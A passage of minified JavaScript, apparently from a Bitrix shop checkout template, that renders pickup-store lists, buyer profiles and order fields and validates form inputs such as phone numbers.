main"}}),c=BX("BUYER_STORE"),p=!1;if(c&&(t=c.value),(o=this.pickUpBlockNode.querySelector(".bx-soa-pickup-list.recommend"))||(o=this.pickUpHiddenBlockNode.querySelector(".bx-soa-pickup-list.recommend")),o&&o.querySelector(".bx-soa-pickup-list-item.bx-selected"))p=!0;else if((a=this.getSelectedDelivery())&&a.STORE)for(i=0;i<a.STORE.length;i++)a.STORE[i]==t&&(p=!0);for(i=0;i<this.pickUpPagination.currentPage.length;i++)(r=this.pickUpPagination.currentPage[i]).ID!=t&&0!=parseInt(t)&&p||(t=c.value=r.ID,p=!0),l=this.createPickUpItem(r,{selected:r.ID==t}),n.appendChild(l);e?((s=this.pickUpHiddenBlockNode.querySelector(".bx_soa_pickup .bx-soa-pickup-list-outer-wrap"))||(s=this.pickUpBlockNode.querySelector(".bx-soa-pp-company-item")),s.insertBefore(BX.create("DIV",{props:{className:"bx-soa-title-subblock"},html:this.params.MESS_PICKUP_LIST}),this.pickUpBlockNode.querySelector(".bx_soa_pickup")),s.querySelector(".bx_soa_pickup .bx-soa-pickup-list-outer-wrap").appendChild(n)):(s=this.pickUpBlockNode.querySelector(".bx-soa-pickup-list.main"),BX.insertAfter(n,s),BX.remove(s)),this.pickUpPagination.show&&this.showPagination("pickUp",n)}},pickUpFinalAction:function(){var e,t=this.getSelectedDelivery();t&&(e=this.lastSelectedDelivery!==parseInt(t.ID),this.lastSelectedDelivery=parseInt(t.ID)),e&&this.pickUpBlockNode.id!==this.activeSectionId&&(this.pickUpBlockNode.id!==this.activeSectionId&&this.editFadePickUpContent(BX.lastChild(this.pickUpBlockNode)),BX.removeClass(this.pickUpBlockNode,"bx-step-completed")),this.maps&&this.maps.pickUpFinalAction()},getStoreInfoHtml:function(e){var t="";return e.PHONE&&(t+='<div class="prop">'+BX.message("SOA_PICKUP_PHONE")+": "+BX.util.htmlspecialchars(e.PHONE)+"</div>"),e.SCHEDULE&&(t+='<div class="prop">'+BX.message("SOA_PICKUP_WORK")+": "+BX.util.htmlspecialchars(e.SCHEDULE)+"</div>"),t},createPickUpItem:function(e,t){t=t||{};var s,i,o,a,r="bx-soa-pickup-l-item-props",l="bx-soa-pickup-l-item-btn";"Y"===this.params.SHOW_STORES_IMAGES?(s=this.getImageSources(e,"IMAGE_ID"),a=s&&s.src_1x||this.defaultStoreLogo,BX.create("IMG",{props:{src:a,className:"bx-soa-pickup-l-item-img"},events:{click:BX.delegate((function(e){this.popupShow(e,s&&s.src_orig||a)}),this)}})):(r+=" no-image",l+=" no-image"),i=this.getStoreInfoHtml(e);let n=e.TITLE?e.TITLE+",":"";return o=BX.create("DIV",{props:{className:"bx-soa-pickup-list-item",id:"store-"+e.ID},children:[BX.create("DIV",{props:{className:"bx-soa-pickup-item-info"},children:[BX.create("DIV",{props:{className:"bx-soa-pickup-l-item-adress"},children:t.distance?[BX.util.htmlspecialchars(n+" "+e.ADDRESS)," ( ~"+t.distance+" "+BX.message("SOA_DISTANCE_KM")+" ) "]:[BX.util.htmlspecialchars(n+" "+e.ADDRESS)]}),BX.create("DIV",{props:{className:r},children:[BX.create("DIV",{props:{className:"bx-soa-pickup-l-item-desc font_13"},html:i})]})]}),BX.create("DIV",{props:{className:l},children:[BX.create("A",{props:{href:"javascript:;",className:"btn btn-sm btn-default "},html:t.selected?this.params.MESS_SELECTED_PICKUP:this.params.MESS_SELECT_PICKUP,events:{click:BX.delegate((function(e){this.selectStore(e)}),this)}})]})],events:{click:BX.proxy(this.selectStore,this)}}),t.selected&&BX.addClass(o,"bx-selected"),o},editPickUpRecommendList:function(e){if(this.maps&&this.maps.canUseRecommendList()&&e){BX.remove(BX("pickUpLoader"));var t,s,i,o,a,r,l=BX.create("DIV",{props:{className:"bx-soa-pickup-list recommend"}}),n=BX("BUYER_STORE"),c=this.getSelectedDelivery(),p=this.maps.getRecommendedStoreIds(e);for(t=0;t<p.length;t++)i=p[t],s=this.getPickUpInfoArray([i])[0],0===t&&parseInt(c.ID)!==this.lastSelectedDelivery&&(n.value=parseInt(i)),o=this.maps.getDistance(e,i),a=this.createPickUpItem(s,{selected:n.value===i,distance:o}),l.appendChild(a),c.STORE_MAIN&&c.STORE_MAIN.splice(c.STORE_MAIN.indexOf(i),1);(r=this.pickUpHiddenBlockNode.querySelector(".bx_soa_pickup .bx-soa-pickup-list-outer-wrap"))||(r=this.pickUpBlockNode.querySelector(".bx_soa_pickup .bx-soa-pickup-list-outer-wrap")),r.appendChild(l)}},selectStore:function(e){var t,s,i,o,a,r,l,n,c,p=BX("BUYER_STORE");if(BX.type.isString(e)){if(!(t=BX("store-"+e))){for(o=0;o<this.pickUpPagination.pages.length;o++)for(r=this.pickUpPagination.pages[o],a=0;a<r.length;a++)if(r[a].ID==e){this.showPickUpItemsPage(++o);break}t=BX("store-"+e)}}else l=e.target||e.srcElement,t=BX.hasClass(l,"bx-soa-pickup-list-item")?l:BX.findParent(l,{className:"bx-soa-pickup-list-item"});if(t&&p){if(BX.hasClass(t,"bx-selected"))return;i=t.id.substr("store-".length),(s=this.pickUpBlockNode.querySelector(".bx-selected"))&&(s.querySelector(".bx-soa-pickup-l-item-btn .btn").innerText=this.params.MESS_SELECT_PICKUP,BX.removeClass(s,"bx-selected")),n=t.clientHeight,t.style.overflow="hidden",BX.addClass(t,"bx-selected"),c=t.clientHeight,t.style.height=n+"px",t.querySelector(".bx-soa-pickup-l-item-btn .btn").innerText=this.params.MESS_SELECTED_PICKUP,new BX.easing({duration:300,start:{height:n,opacity:0},finish:{height:c,opacity:100},transition:BX.easing.transitions.quad,step:function(e){t.style.height=e.height+"px"},complete:function(){t.removeAttribute("style")}}).animate(),p.setAttribute("value",i),this.maps&&this.maps.selectBalloon(i)}},getDeliverySortedArray:function(e){var t,s=[],i=[],o=function(e,t){var s=parseInt(e.SORT)-parseInt(t.SORT);return 0===s?e.OWN_NAME.toLowerCase()>t.OWN_NAME.toLowerCase()?1:e.OWN_NAME.toLowerCase()<t.OWN_NAME.toLowerCase()?-1:0:s};for(t in e)e.hasOwnProperty(t)&&("L"===this.params.SHOW_NOT_CALCULATED_DELIVERIES&&e[t].CALCULATE_ERRORS?i.push(e[t]):s.push(e[t]));return s.sort(o),i.sort(o),s.concat(i)},editPropsBlock:function(e){this.propsBlockNode&&this.propsHiddenBlockNode&&this.result.ORDER_PROP&&(e?this.editActivePropsBlock(!0):this.editFadePropsBlock(),this.initialized.props=!0)},editActivePropsBlock:function(e){var t,s,i=e?this.propsBlockNode:this.propsHiddenBlockNode;this.opened[this.propsBlockNode.id]&&(this.propsBlockNode.classList.remove("bx-step-completed"),this.propsBlockNode.classList.remove("bx-selected")),this.initialized.props?this.maps&&setTimeout(BX.proxy(this.maps.propsMapFocusWaiter,this.maps),200):(this.result.IS_AUTHORIZED||this.opened[this.propsBlockNode.id]||(this.opened[this.propsBlockNode.id]=!0),this.opened[this.propsBlockNode.id]||this.propsBlockNode.classList.add("bx-step-completed"),(t=i.querySelector(".bx-soa-section-content"))?BX.cleanNode(t):(t=this.getNewContainer(),i.appendChild(t)),this.getErrorContainer(t),this.showPersonType(),s=BX.create("DIV",{props:{className:"row"}}),this.editPropsItems(s),t.appendChild(s),this.showSaveProfile(t)),this.getPropsCompactInfo(),this.hasUserProfiles()||!this.result.IS_AUTHORIZED?this.showFirstProps():setTimeout(BX.delegate((function(){this.showFirstProps()}),this),100)},showFirstProps:function(){this.checkEmptyProps()?(this.opened[this.propsBlockNode.id]=!0,this.propsBlockNode.classList.remove("bx-step-completed"),this.propsBlockNode.classList.remove("bx-selected")):this.opened[this.propsBlockNode.id]&&!this.opened.edit_profile&&(this.opened[this.propsBlockNode.id]=!1,this.propsBlockNode.classList.add("bx-step-completed"))},checkEmptyProps:function(){return this.isValidPropertiesBlock(!0,this.propsBlockNode,!0).length},showSaveProfile:function(e){e.appendChild(BX.create("DIV",{props:{className:"bx-soa-more"},children:[BX.create("DIV",{props:{className:"bx-soa-more-btn btn btn-default"},html:BX.message("TITLE_SOA_SAVE_INFO_SECTION"),events:{click:BX.proxy(this.saveProfile,this)}})]}))},saveProfile:function(){if(!this.isValidPropertiesBlock().length)if(this.propsBlockNode.querySelector(".alert.alert-danger").style.display="none",BX.cleanNode(this.propsBlockNode.querySelector(".alert.alert-danger")),BX.removeClass(this.propsBlockNode,"bx-step-error"),this.hasUserProfiles()){if(!this.startLoader())return;BX.ajax({method:"POST",dataType:"json",url:this.templateFolder+"/ajax.php",data:Object.assign(this.getData("saveProfile"),{props:this.result.ORDER_PROP}),onsuccess:BX.delegate((function(e){this.endLoader(),e.profileID&&(this.opened[this.propsBlockNode.id]=!1,this.opened.edit_profile=!1,this.showTempProfileInput(e),this.sendRequest("",{"change-profile":"Y"})),e.error.length>0&&console.error(e.error)}),this),onfailure:BX.delegate((function(){this.endLoader()}),this)})}else this.opened[this.propsBlockNode.id]=!1,this.fade(this.propsBlockNode,this.propsBlockNode),this.show(this.propsBlockNode),document.querySelector(".pandd .bx-active .change-info").click()},showTempProfileInput:function(e){this.propsBlockNode.querySelector(".profiles-content").appendChild(BX.create("INPUT",{props:{type:"radio",value:e.profileID,id:"ID_PROFILE_ID_"+e.profileID,name:"PROFILE_ID",className:"hidden",checked:"Y"}}))},getPropsCompactInfo:function(){const e=this.propsBlockNode.querySelector(".profiles-content");BX.cleanNode(e),this.showInfoFromProps(e)},showInfoFromProps:function(e){const t=[];let s,i;if(this.hasUserProfiles()&&"Y"===this.params.ALLOW_USER_PROFILES){for(let e in this.result.USER_PROFILES)t.unshift(this.showPropItem(this.result.USER_PROFILES[e]));"Y"===this.params.ALLOW_NEW_PROFILE&&(s=BX.create("div",{props:{className:"col-sm-12"},children:[BX.create("label",{props:{className:"btn btn-default add-profile",htmlFor:"ID_PROFILE_ID_0"},children:[BX.create("INPUT",{props:{type:"radio",value:0,id:"ID_PROFILE_ID_0",name:"PROFILE_ID",className:"hidden"}}),BX.create("span",{text:BX.message("ADD_NEW_PROFILE")})],events:{click:BX.delegate(this.changeProfile,this)}})]})),i=BX.create("INPUT",{props:{type:"hidden",value:"N",id:"profile_change",name:"profile_change"}})}else t.push(this.showPropItem());e.appendChild(BX.create("div",{props:{className:"bx-soa-pp row"},children:[BX.create("div",{props:{className:"col-sm-12 bx-soa-pp-item-container"},children:t}),s,i]}))},changeProfile:function(){this.opened[this.propsBlockNode.id]=!0,this.opened.edit_profile=!0,BX("ID_PROFILE_ID_0").setAttribute("type","hidden"),BX("profile_change").value="Y",this.sendRequest()},showPropItem:function(e){const t=[],s=this.getPropByFilter({USER_PROPS:"Y",IS_PROFILE_NAME:"Y"});let i=this.getInputValueForProp(s)||BX.message("NO_PROFILE_NAME");e&&e.NAME&&(i=e.NAME);const o=e?e.CHECKED:"Y",a=e?e.ID:0,r=[BX.create("INPUT",{props:{id:"ID_PROFILE_ID_"+a,name:"PROFILE_ID",type:"radio",className:"bx-soa-pp-company-checkbox form-radiobox__input",value:a,checked:o},events:{change:BX.delegate(this.selectProfile,this)}}),BX.create("LABEL",{props:{htmlFor:"ID_PROFILE_ID_"+a,className:"bx-soa-pp-company-label properties__value bx-soa-block-title form-radiobox__label",lang:"ru"},html:"<span>"+i+"</span><span class='form-radiobox__box'></span>"})],l=BX.create("DIV",{props:{className:"bx-soa-pp-company-graf-container properties form-radiobox"},children:r});t.push(l);let n=!1;const c=[],p=this.getPropByFilter({USER_PROPS:"Y",IS_EMAIL:"Y"});let h=this.getInputValueForProp(p);if(e&&this.result.USER_PROFILES_PROPS&&this.result.USER_PROFILES_PROPS[e.ID]&&this.result.USER_PROFILES_PROPS[e.ID].EMAIL&&(h=this.result.USER_PROFILES_PROPS[e.ID].EMAIL),h){const e=BX.create("DIV",{props:{className:"bx-soa-pp-company-label properties__value bx-soa-email"},html:"<span>"+h+"</span>"});c.push(e),n=!0}const d=this.getPropByFilter({USER_PROPS:"Y",IS_PHONE:"Y"});let u,m=this.getInputValueForProp(d);if(e&&this.result.USER_PROFILES_PROPS&&this.result.USER_PROFILES_PROPS[e.ID]&&this.result.USER_PROFILES_PROPS[e.ID].PHONE&&(m=this.result.USER_PROFILES_PROPS[e.ID].PHONE),m){const e=BX.create("DIV",{props:{className:"bx-soa-pp-company-label properties__value bx-soa-phone"},html:"<span>"+m+"</span>"});c.push(e),n=!0}if("Y"===o&&(u=BX.create("DIV",{props:{className:"bx-soa-inner"},html:"<span class='bx-soa-change-profile font_13'>"+BX.message("TITLE_SOA_CHANGE_INFO_SECTION")+"</span>",events:{click:BX.proxy(this.editProfile,this)}})),n){const e=BX.create("DIV",{props:{className:"bx-soa-pp-company-props"},children:[BX.create("div",{props:{className:"bx-soa-inner"},children:c}),u]});t.push(e)}else t.push(u);const B=BX.create("DIV",{props:{className:"bx-soa-pp-company-inner filter radio bordered rounded3"+(o?" active":"")},children:t});return BX.create("div",{props:{className:"bx-soa-pp-company bx-soa-pp-company-item col-sm-6 col-xs-12"},children:[B]})},selectProfile:function(){BX("profile_change").value="Y",this.sendRequest()},getInputValueForProp:function(e){if(e){let t=document.querySelector("input[name=ORDER_PROP_"+e.ID+"]");return t&&t.value&&t.value.length>1?t.value.trim():null}return null},getPropByFilter:function(e){return this.result.ORDER_PROP&&this.result.ORDER_PROP.properties&&e?this.result.ORDER_PROP.properties.find((function(t){return Object.keys(e).every((function(s){return t[s]===e[s]}))})):null},editProfile:function(){this.propsBlockNode.classList.remove("bx-step-completed"),this.propsBlockNode.classList.remove("bx-selected"),this.opened[this.propsBlockNode.id]=!0},showPersonType:function(){const e=this.propsBlockNode.querySelector(".bx-soa-person-type");BX.cleanNode(e),this.getPersonTypeControl(e)},editFadePropsBlock:function(){this.propsBlockNode.querySelector(".bx-soa-section-content");this.initialized.props||(this.editActivePropsBlock(!1),BX.remove(BX.lastChild(this.propsBlockNode)))},editFadePropsContent:function(e){if(e&&this.locationsInitialized){var t,s,i=this.propsHiddenBlockNode.querySelector(".alert"),o=this.getSelectedPersonType();i&&e.appendChild(i.cloneNode(!0)),o&&(t="PROPS_FADE_LIST_"+o.ID,s=this.params[t]),!s||s.length,this.propsBlockNode.getAttribute("data-visited")}},editPropsItems:function(e){if(this.result.ORDER_PROP&&this.propertyCollection){for(var t,s,i,o,a=BX.create("div",{props:{className:"row row-props group-without-margin"}}),r=this.propertyCollection.getGroupIterator();s=r();)for(o=s.getIterator();i=o();)this.deliveryLocationInfo.loc!=i.getId()&&this.deliveryLocationInfo.zip!=i.getId()&&this.deliveryLocationInfo.city!=i.getId()&&"ADDRESS"!==i.getSettings().CODE&&this.getPropertyRowNode(i,a,!1);t=BX.create("DIV",{props:{className:"col-sm-12 bx-soa-customer"},children:[a]}),e.appendChild(t)}},getPropertyRowNode:function(e,t,s,i){var o,a=BX.create("DIV"),r="",l=e.getType()||"",n=e.getDescription()||"";let c=void 0===i||i;switch(s?a.innerHTML="<strong>"+BX.util.htmlspecialchars(e.getName())+":</strong> ":(BX.addClass(a,"bx-soa-customer-field form-group"),c&&BX.addClass(a,"col-sm-6"),r+=BX.util.htmlspecialchars(e.getName()),e.isRequired()&&(r+='<span class="bx-authform-starrequired">*</span> '),n.length&&"STRING"!=l&&"NUMBER"!=l&&"DATE"!=l&&(r+=" <small>("+BX.util.htmlspecialchars(n)+")</small>"),o=BX.create("LABEL",{attrs:{for:"soa-property-"+e.getId()},props:{className:"bx-soa-custom-label"},html:r}),a.setAttribute("data-property-id-row",e.getId()),a.appendChild(o)),l){case"LOCATION":this.insertLocationProperty(e,a,s);break;case"DATE":this.insertDateProperty(e,a,s);break;case"FILE":this.insertFileProperty(e,a,s);break;case"STRING":this.insertStringProperty(e,a,s);break;case"ENUM":this.insertEnumProperty(e,a,s);break;case"Y/N":this.insertYNProperty(e,a,s);break;case"NUMBER":this.insertNumberProperty(e,a,s)}t.appendChild(a)},insertLocationProperty:function(e,t,s){var i,o,a,r,l,n,c,p,h=[];if(e.getId()in this.locations)if(s){if(i=this.propsHiddenBlockNode.querySelector('[data-property-id-row="'+e.getId()+'"]'))for(o=i.querySelectorAll("div.bx-soa-loc"),c=0;c<o.length;c++)a=this.getLocationString(o[c]),h.push(a.length?BX.util.htmlspecialchars(a):BX.message("SOA_NOT_SELECTED"));t.innerHTML+=h.join("<br>")}else{for(n=BX.create("DIV",{props:{className:"soa-property-container"}}),i=this.locations[e.getId()],c=0;c<i.length;c++)for(p in r=i[c]?i[c].output:{},l=BX.create("DIV",{props:{className:"bx-soa-loc"},html:r.HTML}),e.isMultiple()&&(l.style.marginBottom="search"==this.locationsTemplate?"5px":"20px"),n.appendChild(l),r.SCRIPT)r.SCRIPT.hasOwnProperty(p)&&BX.evalGlobal(r.SCRIPT[p].JS);e.isMultiple()&&n.appendChild(BX.create("DIV",{attrs:{"data-prop-id":e.getId()},props:{className:"btn btn-sm btn-default"},text:BX.message("ADD_DEFAULT"),events:{click:BX.proxy(this.addLocationProperty,this)}})),t.appendChild(n)}},addLocationProperty:function(e){var t,s,i,o=e.target||e.srcElement,a=o.getAttribute("data-prop-id"),r=BX.previousSibling(o),l=0,n="sls-",c=BX.util.getRandomString(5);if(BX.hasClass(r,"bx-soa-loc")&&("search"==this.locationsTemplate?(i=r.querySelector("input[type=text][class=dropdown-field]"))&&(l=parseInt(i.name.substring(i.name.indexOf("[")+1,i.name.indexOf("]")))+1):(i=r.querySelectorAll("input[type=hidden]")).length&&(i=i[i.length-1],l=parseInt(i.name.substring(i.name.indexOf("[")+1,i.name.indexOf("]")))+1)),this.cleanLocations[a]){for(s in t=BX.create("DIV",{props:{className:"bx-soa-loc"},style:{marginBottom:"search"==this.locationsTemplate?"5px":"20px"},html:this.cleanLocations[a].HTML.split("#key#").join(l).replace(/sls-\d{5}/g,n+c)}),o.parentNode.insertBefore(t,o),BX.saleOrderAjax.addPropertyDesc({id:a+"_"+l,attributes:{id:a+"_"+l,type:"LOCATION",valueSource:"form"}}),this.cleanLocations[a].SCRIPT)this.cleanLocations[a].SCRIPT.hasOwnProperty(s)&&BX.evalGlobal(this.cleanLocations[a].SCRIPT[s].JS.split("_key__").join("_"+l).replace(/sls-\d{5}/g,n+c));BX.saleOrderAjax.initDeferredControl()}},insertDateProperty:function(e,t,s){var i,o,a,r,l,n;if(s){if(i=this.propsHiddenBlockNode.querySelector('div[data-property-id-row="'+e.getId()+'"]')){for(a=[],o=i.querySelectorAll("input[type=text]"),r=0;r<o.length;r++)o[r].value&&o[r].value.length&&a.push(o[r].value);t.innerHTML+=this.valuesToString(a)}}else{for(l=BX.create("DIV",{props:{className:"soa-property-container"}}),e.appendTo(l),t.appendChild(l),n=l.querySelectorAll("input[type=text]"),r=0;r<n.length;r++)this.alterDateProperty(e.getSettings(),n[r]);this.alterProperty(e.getSettings(),l),this.bindValidation(e.getId(),l)}},insertFileProperty:function(e,t,s){var i,o,a,r,l,n,c;if(s){if(i=this.propsHiddenBlockNode.querySelector('div[data-property-id-row="'+e.getId()+'"]')){for(a=[],o=i.querySelectorAll("a"),r=0;r<o.length;r++)(l=o[r].innerHTML).length&&a.push(l);t.innerHTML+=this.valuesToString(a)}}else(n=this.savedFilesBlockNode.querySelector('div[data-property-id-row="'+e.getId()+'"]'))&&(c=n.querySelector("div.soa-property-container")),c?t.appendChild(c):(c=BX.create("DIV",{props:{className:"soa-property-container"}}),e.appendTo(c),t.appendChild(c),this.alterProperty(e.getSettings(),c))},insertStringProperty:function(e,t,s){var i,o,a,r,l;if(s){if(i=this.propsHiddenBlockNode.querySelector('div[data-property-id-row="'+e.getId()+'"]')){if(a=[],0==(o=i.querySelectorAll("input[type=text]")).length&&(o=i.querySelectorAll("textarea")),o.length)for(r=0;r<o.length;r++)o[r].value.length&&a.push(o[r].value);t.innerHTML+=this.valuesToString(a)}}else l=BX.create("DIV",{props:{className:"soa-property-container"}}),e.appendTo(l),t.appendChild(l),this.alterProperty(e.getSettings(),l),"Y"===e.getSettings().IS_PHONE?this.bindValidationPhone(e.getId(),l):this.bindValidation(e.getId(),l)},insertEnumProperty:function(e,t,s){var i,o,a,r,l;if(s){if(i=this.propsHiddenBlockNode.querySelector('div[data-property-id-row="'+e.getId()+'"]')){if(a=[],(o=i.querySelectorAll("input[type=radio]")).length)for(r=0;r<o.length;r++)o[r].checked&&a.push(o[r].nextSibling.nodeValue);if((o=i.querySelectorAll("option")).length)for(r=0;r<o.length;r++)o[r].selected&&a.push(o[r].innerHTML);t.innerHTML+=this.valuesToString(a)}}else l=BX.create("DIV",{props:{className:"soa-property-container"}}),e.appendTo(l),t.appendChild(l),this.bindValidation(e.getId(),l)},insertYNProperty:function(e,t,s){var i,o,a,r,l;if(s){if(i=this.propsHiddenBlockNode.querySelector('div[data-property-id-row="'+e.getId()+'"]')){for(a=[],o=i.querySelectorAll("input[type=checkbox]"),r=0;r<o.length;r+=2)a.push(o[r].checked?BX.message("SOA_YES"):BX.message("SOA_NO"));t.innerHTML+=this.valuesToString(a)}}else l=BX.create("DIV",{props:{className:"soa-property-container"}}),e.appendTo(l),t.appendChild(l),this.alterProperty(e.getSettings(),l),this.bindValidation(e.getId(),l)},insertNumberProperty:function(e,t,s){var i,o,a,r,l;if(s){if(i=this.propsHiddenBlockNode.querySelector('div[data-property-id-row="'+e.getId()+'"]')){for(a=[],o=i.querySelectorAll("input[type=text]"),r=0;r<o.length;r++)o[r].value.length&&a.push(o[r].value);t.innerHTML+=this.valuesToString(a)}}else l=BX.create("DIV",{props:{className:"soa-property-container"}}),e.appendTo(l),t.appendChild(l),this.alterProperty(e.getSettings(),l),this.bindValidation(e.getId(),l)},valuesToString:function(e){var t=e.join(", ");return t.length?BX.util.htmlspecialchars(t):BX.message("SOA_NOT_SELECTED")},alterProperty:function(e,t){var s,i,o,a,r,l,n,c,p=BX.findChildren(t,{tagName:"DIV"});if(p&&p.length)for(s=0;s<p.length;s++)p[s].style.margin="5px 0";for((i=t.querySelector("input[type=text]"))||(i=t.querySelector("textarea")),i&&(i.id="soa-property-"+e.ID,"Y"==e.IS_ADDRESS&&i.setAttribute("autocomplete","address"),"Y"==e.IS_EMAIL&&i.setAttribute("autocomplete","email"),"Y"==e.IS_PAYER&&i.setAttribute("autocomplete","name"),"Y"==e.IS_PHONE&&(i.setAttribute("autocomplete","tel"),i.classList.add("phone")),e.PATTERN&&e.PATTERN.length&&i.removeAttribute("pattern")),o=t.querySelectorAll("input[type=text]"),s=0;s<o.length;s++)o[s].placeholder=e.DESCRIPTION,BX.addClass(o[s],"form-control bx-soa-customer-input bx-ios-fix");for(o=t.querySelectorAll("select"),s=0;s<o.length;s++)BX.addClass(o[s],"form-control");for(o=t.querySelectorAll("textarea"),s=0;s<o.length;s++)o[s].placeholder=e.DESCRIPTION,BX.addClass(o[s],"form-control bx-ios-fix");for(a=t.querySelectorAll("label"),s=0;s<a.length;s++)BX.remove(a[s]);if("FILE"==e.TYPE){if(e.ACCEPT&&e.ACCEPT.length)for(l=t.querySelectorAll("input[type=file]"),n=this.getFileAccepts(e.ACCEPT),s=0;s<l.length;s++)l[s].setAttribute("accept",n);for(c=t.querySelectorAll("a"),s=0;s<c.length;s++)BX.bind(c[s],"click",(function(e){var t=e.target||e.srcElement,s=t&&t.nextSibling&&t.nextSibling.nextSibling;s&&BX.fireEvent(s,"change")}))}for(r=t.querySelectorAll("input[type=button]"),s=0;s<r.length;s++)BX.addClass(r[s],"btn btn-default btn-sm"),"Y"==e.MULTIPLE&&s==r.length-1||"FILE"==e.TYPE&&(BX.prepend(r[s],r[s].parentNode),r[s].style.marginRight="10px");r.length&&(r=r[r.length-1],BX.bind(r,"click",BX.delegate((function(s){var i,o,a,r,l=s.target||s.srcElement,n=BX.findParent(l,{tagName:"div",className:"soa-property-container"}),c=n.querySelector("label"),p=n.querySelectorAll("input[type=button]"),h=n.querySelectorAll("input[type=text]"),d=n.querySelectorAll("textarea"),u=BX.findChildren(n,{tagName:"DIV"});if(u&&u.length)for(i=0;i<u.length;i++)u[i].style.margin="5px 0";if(this.bindValidation(e.ID,n),p.length&&p[p.length-2]&&(BX.prepend(p[p.length-2],p[p.length-2].parentNode),p[p.length-2].style.marginRight="10px",BX.addClass(p[p.length-2],"btn btn-default btn-sm")),c&&BX.remove(c),h.length&&(h[h.length-1].placeholder=e.DESCRIPTION,BX.addClass(h[h.length-1],"form-control bx-soa-customer-input bx-ios-fix"),"DATE"==e.TYPE&&this.alterDateProperty(e,h[h.length-1]),e.PATTERN&&e.PATTERN.length&&h[h.length-1].removeAttribute("pattern")),d.length&&(d[d.length-1].placeholder=e.DESCRIPTION,BX.addClass(d[d.length-1],"form-control bx-ios-fix")),"FILE"==e.TYPE){if(e.ACCEPT&&e.ACCEPT.length)for(a=t.querySelectorAll("input[type=file]"),r=this.getFileAccepts(e.ACCEPT),i=0;i<a.length;i++)a[i].setAttribute("accept",r);o=n.querySelectorAll("a"),BX.bind(o[o.length-1],"click",(function(e){var t=e.target||e.srcElement,s=t&&t.nextSibling&&t.nextSibling.nextSibling;s&&setTimeout((function(){BX.fireEvent(s,"change")}),10)}))}}),this)))},alterDateProperty:function(e,t){var s,i=BX.findParent(t,{tagName:"DIV"});BX.addClass(i,"input-group"),s=BX.create("DIV",{props:{className:"input-group-addon"},children:[BX.create("I",{props:{className:"bx-calendar"}})]}),BX.insertAfter(s,t),BX.remove(i.querySelector("input[type=button]")),BX.bind(s,"click",BX.delegate((function(t){var s=t.target||t.srcElement,i=BX.findParent(s,{tagName:"DIV",className:"input-group"});BX.calendar({node:i.querySelector(".input-group-addon"),field:i.querySelector("input[type=text]").name,form:"",bTime:"Y"==e.TIME,bHideTime:!1})}),this))},isValidForm:function(){if(!this.options.propertyValidation)return!0;var e=this.isValidRegionBlock(),t=this.isValidPropertiesBlock(),s=!1;if(e.length&&(s=!0,this.animateScrollTo(this.deliveryBlockNode,800,50)),t.length&&!s&&setTimeout(BX.delegate((function(){this.animateScrollTo(this.propsBlockNode,800,50)}),this),100),e.length)this.showError(this.deliveryBlockNode,e),BX.addClass(this.deliveryBlockNode,"bx-step-error"),this.deliveryBlockNode.classList.remove("bx-step-completed"),this.deliveryBlockNode.classList.remove("bx-selected"),this.opened[this.deliveryBlockNode.id]=!0;else{const e=this.deliveryBlockNode.querySelector(".alert.alert-danger");e&&(e.style.display="none",BX.cleanNode(e)),BX.removeClass(this.deliveryBlockNode,"bx-step-error")}return t.length?(this.opened[this.propsBlockNode.id]||this.editProfile(),this.showError(this.propsBlockNode,t),BX.addClass(this.propsBlockNode,"bx-step-error")):(this.propsBlockNode.querySelector(".alert.alert-danger").style.display="none",BX.cleanNode(this.propsBlockNode.querySelector(".alert.alert-danger")),BX.removeClass(this.propsBlockNode,"bx-step-error")),!(e.length+t.length+this.getCountValidationErrorInLicensesBlock())},isValidRegionBlock:function(){if(!this.options.propertyValidation)return[];var e,t,s,i,o=this.orderBlockNode.querySelectorAll(".bx-soa-location-input-container[data-property-id-row]"),a=[];for(i=0;i<o.length;i++)e=o[i].getAttribute("data-property-id-row"),t=this.validation.properties[e],s=this.getValidationData(t,o[i]),a=a.concat(this.isValidProperty(s,!0));return a=a.concat(this.isValidPropertiesBlock(!1,this.deliveryBlockNode))},getValidationDataPhone:function(e,t){var s,i={};if(!e?.TYPE)return i;switch(e.TYPE){case"STRING":if(i.action="blur",i.func=BX.delegate((function(t,s){return this.validatePhone(t,e,s)}),this),s=t.querySelectorAll("input.phone"),$(s).length){i.inputs=s;break}}return i},bindValidationPhone:function(e,t){if(this.validation.properties&&this.validation.properties[e]){var s=this.validation.properties[e],i=this.getValidationDataPhone(s,t);if(i&&i.inputs&&i.action&&"object"==typeof appAspro&&appAspro&&appAspro.phone)for(let e=0,t=i.inputs.length;e<t;++e)BX.type.isElementNode(i.inputs[e])&&(appAspro.phone.init($(i.inputs[e]),{useValidate:!1,async:!1}),BX.bind(i.inputs[e],i.action,BX.delegate((function(){this.isValidProperty(i)}),this)))}},validatePhone:function(e,t,s){if(!e||!t)return[];var i=e.value,o=[],a=BX.util.htmlspecialchars(t.NAME),r=BX.message("SOA_FIELD")+' "'+a+'"';return"Y"==t.REQUIRED&&0==i.length&&o.push(r+" "+BX.message("SOA_REQUIRED")),"Y"==t.IS_PHONE&&i.length>0&&(this.validateNormalPhone(e,o,r),this.validateIntlPhone(e,o,r)),o.filter(Boolean)},validateNormalPhone:function(e,t,s){arAsproOptions.THEME.PHONE_MASK&&arAsproOptions.THEME.VALIDATE_PHONE_MASK&&!appAspro.phone.checkIntlPhone&&(new RegExp(arAsproOptions.THEME.VALIDATE_PHONE_MASK).test($(e).val())||t.push(s+" "+BX.message("JS_FORMAT_ORDER")))},validateIntlPhone:function(e,t,s){if(appAspro.phone.checkIntlPhone){const s=$(e).data("iti");if("object"==typeof s&&s){s.isValidNumber()||t.push(BX.message(appAspro.phone.errorMap[s.getValidationError()]))}}},isValidPropertiesBlock:function(e,t,s){if(!this.options.propertyValidation)return[];var i,o,a,r,l,n,c=(t||this.propsBlockNode).querySelectorAll(".bx-soa-customer-field[data-property-id-row]"),p=[];for(n=0;n<c.length;n++)i=c[n].getAttribute("data-property-id-row"),e&&this.locations[i]||(o=c[n].querySelector(".soa-property-container"))&&(a=this.validation.properties[i],r=this.getValidationData(a,o),l=this.getValidationDataPhone(a,o),r=$.extend({},r,l),p=p.concat(this.isValidProperty(r,!0,s)));return p},isValidProperty:function(e,t,s){var i,o,a=[];if(!e||!e.inputs)return a;for(o=0;o<e.inputs.length;o++)(i=e.func(e.inputs[o],!!t)).length&&(a[o]=i.join("<br>"));return s||this.showValidationResult(e.inputs,a),a},bindValidation:function(e,t){if(this.validation.properties&&this.validation.properties[e]){var 